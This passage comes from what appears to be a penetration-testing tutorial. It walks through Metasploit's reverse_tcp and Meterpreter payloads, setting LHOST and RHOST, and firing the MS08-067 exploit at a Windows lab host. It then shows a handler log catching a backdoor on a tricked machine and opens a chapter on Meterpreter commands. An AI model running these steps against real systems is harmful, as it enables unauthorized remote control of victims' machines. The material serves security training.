- md: '

    Or you type “set payload” and hit the key twice. This will prompt Metasploit to
    ask you if you want to see all of the available payloads:


    Most of the payloads are laid out in the format of ‘Operating System/Shell Type’
    as shown below:


    - set payload/osx/x86/shell_reverse_tcp

    - set payload/linux/x64/shell_reverse_tcp

    - set payload/windows/shell_reverse_tcp

    - set payload/windows/meterpreter/reverse_tcp


    Simply select the correct OS for your target and pick the payload you want.


    The most popular types of payloads are shells, either a regular remote shell or
    a Meterpreter shell.


    If we want a remote terminal shell to remotely run commands, use the standard
    shell. If you want the capability to manipulate the session and run extended commands
    you will want the Meterpreter shell (which we will discuss in further detail in
    the next chapter).


    There are different types of ways that the payloads communicate back to the attacking
    system. I usually prefer reverse_tcp shells as once they are executed on the target
    system, they tell the attacking machine to connect out to our Kali system.


    The big advantage to this is that with the victim machine technically “initiating”
    the connection out, it is usually not blocked by the Firewall, as a connection
    trying in from the outside most likely will.


    Once we know what payload we want to use, we set it using the “set” command.


    - 6. So for our example let’s use a Meterpreter shell for a Windows system and
    have it connect back to us via TCP:


    ```

    msfploit(msfd_006_metafpi) > set payload windows/meterpreter/reverse_tcp

    payload => windows/meterpreter/reverse_tcp

    ```


    Now that our payload is set, we just need to set the options for it.


    # Setting Payload Options


    Payloads have options that are set in the exact same way that the exploit is set.
    Usually payload settings include the IP address and port for the exploit to connect
    out.


    And these too are set with the “set” command.


    - 7. Type “show options” to see what the payload needs:


    As you can see in the image above, a new section titled "Payload options" shows
    up when we run the command. We also have three new options that we can set, "EXITFUNC,
    LHOST, and LPORT".


    We will leave the EXITFUNC and LPORT settings to the default.


    - 8. But we need to put it in the LHOST or local host address. This is the IP
    for our Kali system:

    ```

    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.10

    LHOST => 192.168.0.10

    ```


    Once our payload options are set, we can go ahead and run the exploit.


    # Running the Exploit


    When starting out, it is always a good idea to run the "show options" command
    one last time and double check that everything is set correctly.


    ```

    msf exploit(ms08_067_netapi) > show options

    Module options (exploit/windows/smb/ms08_067_netapi):

    | Name | Current Setting | Required | Description |

    | :--- | :--- | :--- | :--- |

    | RHOST | yes | yes | The target address |

    | RPORT | 445 | yes | Set the SMB service port |

    | SMBPIPE | BROWSER | yes | The pipe name to use (BROWSER, SRSVCS) |

    ```


    If you notice above, looks like we forgot to set the target system (RHOST) IP
    address! We set the RHOST for a prior example, but when we switched exploits,
    we never re-set the remote host IP address. This can happen when you are running
    through a lot of exploits, or attacking different systems, so it is a good idea
    to double check your settings.


    - 9. Set the RHOST option by typing:

    ```set RHOST 192.168.0.20\```


    Checking the options one last time, everything looks good:


    ![](img/ff9cd19afe449ae54278ee429e668a6f_42_0.png)


    Our payload is selected, and all the options that we need that to are set.


    We can now run the exploit.


    - 10. To do so, simply use the “exploit" command.


    ```

    msf exploit(ms08_067_netapi) > exploit

    ```


    The exploit runs and when successful the payload executes and if the exploit works,
    we get a remote connection.


    # Connecting to a Remote Session


    Once we have a successful exploit we will be able to view any remote sessions
    that were created. To check what sessions were created type the "sessions " command.


    Any sessions that were created will show up along with the IP address, computer
    name and user name of the target system.


    ![](img/ff9cd19afe449ae54278ee429e668a6f_42_1.png)


    We can now connect to the session interactively with the "sessions -i <ID#>" command
    as shown in the sample session above.


    When we connect to the session, the prompt will change into a meterpreter prompt:


    ```

    meterpreter >

    ```


    We will cover the Meterpreter shell in more depth in the next chapter. But for
    now, if we just type the "shell" command we can see that we do indeed have a remote
    shell to the Windows system.


    # Conclusion


    In rather lengthy introduction to Metasploit we learned how to perform some basic
    functions of the framework to enable us to find and use exploits. We also talked
    briefly about using payloads and setting necessary functions.


    Metasploit is able to do a ton of things; we just briefly brushed some of the
    more elementary core functions.


    Again if you are feeling lost at it this point, don''t panic! We will cover the
    entire Meterpreter exploit process later in greater detail.


    Next we will talk about the Meterpreter shell, an amazing and fun interface that
    we can use to manipulate systems that we successfully exploited.


    # Chapter 4 – Meterpreter Shell


    # Resources


    - http://en.wikibooks.org/wiki/Metasploit/MeterpreterClient

    - http://cyberarms.wordpress.com/2013/02/03/remotely-recording-speech-and-turning-it-into-searchable-text-with-metasploit-watson/


    # Introduction


    After a successful exploit a Meterpreter shell allows you to perform many different
    functions along with a full remote shell.


    Meterpreter is for manipulating a system once you get it.


    Meterpreter gives us a set of commands that greatly aid in security testing. For
    example, we can turn on the user and even grab screenshots.


    In this section we will quickly cover the Meterpreter shell and some of its features.


    # Basic Meterpreter Commands


    Let''s start with a machine we tricked into running a backdoor see the chapter
    on "Veil". Once executed the backdoor connected to our Kali system and a session
    was created. We were then dropped into the active session as follows:


    ```

    msf > use multi/handler

    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp

    payload => windows/meterpreter/reverse_tcp

    msf exploit(handler) > set host 192.168.0.142

    192.168.0.142

    msf exploit(handler) > set lport 4000

    lport => 4000

    msf exploit(handler) > exploit


    [*] Started reverse handler on 192.168.0.142:4000

    [*] Starting the payload handler...

    [*] Sending stage (77048 bytes) to 192.168.0.132

    [*] Meterpreter session 1 opened (192.168.0.142:4000) -> 192.168.0.132:49176)
    at 2013-10-20 14:45:55 -0400

    ```


    Once connected to the session we are given a Meterpreter prompt:


    ```

    meterpreter >

    ```


    Okay, let''s see what Meterpreter can do, let''s start by using the help command
    to see what is available.


    ```

    meterpreter > help

    ```


    When we do so, we see that the commands are broken out into sections.


    The commands are:


    - Core Commands

    - File System Commands

    - Networking Commands

    - System Commands

    - User Interface Commands

    - And Priv Commands


    We will not cover all of the commands, but will look at a couple in a little more
    depth. It is a good idea to read through all of them to get a basic understanding
    of what they can do.


    # Core Commands


    ![](img/ff9cd19afe449ae54278ee429e668a6f_45_0.png)


    As a beginner level, you will probably only use background, help, load, migrate,
    run and exit from this list.


    - Background - Background allows you to background a session so that you can get
    back to the msf prompt or access other sessions.

